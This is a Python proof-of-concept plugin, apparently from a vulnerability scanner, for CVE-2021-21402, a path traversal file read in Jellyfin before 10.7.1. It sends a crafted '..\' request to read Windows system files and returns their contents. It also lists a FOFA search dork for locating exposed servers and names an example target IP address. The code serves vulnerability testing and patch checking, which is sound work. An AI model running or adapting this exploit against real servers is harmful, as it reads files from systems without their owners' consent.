#coding:utf-8
import requests
import urllib3
import sys
# ...
urllib3.disable_warnings()
# sys.path.append(root_path)
from lib.common import url_handle,get_random_ua

_info = {
    "version" : "1",
    "author" : "jijue",
    "CreateDate" : "2021-05-18",
    "PocDesc" : """
    略  
    """,

    "name" : "Jellyfin任意文件读取",
    "AppName" : "Jellyfin",
    "AppVersion" : "Jellyfin < 10.7.1",
    "VulnDate" : "2021-05-10",
    "VulnDesc" : """
    Jellyfin是一个免费软件媒体系统。
    在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。
    当Windows用作主机OS时，此问题更为普遍。暴露于公共Internet的服务器可能会受到威胁。
    在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问，但是建议尽快进行更新。
    """,

    "fofa-dork":"title=\"Jellyfin\"",
    "example" : "34.95.215.4",
    "exp_img" : "",

    "timeout" : 5,
}

def verify(host,proxy):
    """
    Jellyfin任意文件读取  
    CVE-2021-21402  
    fofa:title="Jellyfin"  
    """

    # global vul_list
    # vul_list[1] = sys._getframe().f_code.co_name#获取当前函数名
    vuln = [False,""]
    url = url_handle(host) + "/Audio/1/hls/..\..\..\..\..\..\..\Windows\win.ini/stream.mp3/"

    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }

    headers = {"User-Agent":get_random_ua(),
                "Connection":"close",
                # "Content-Type": "application/x-www-form-urlencoded",
                }

    try:
        if proxy:
            req = requests.get(url,timeout = _info["timeout"],headers = headers,proxies=proxies,verify = False)
        else:
            req = requests.get(url,timeout = 6,verify = False)
        if req.status_code == 200 and req.text is not None:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln
# print "yes"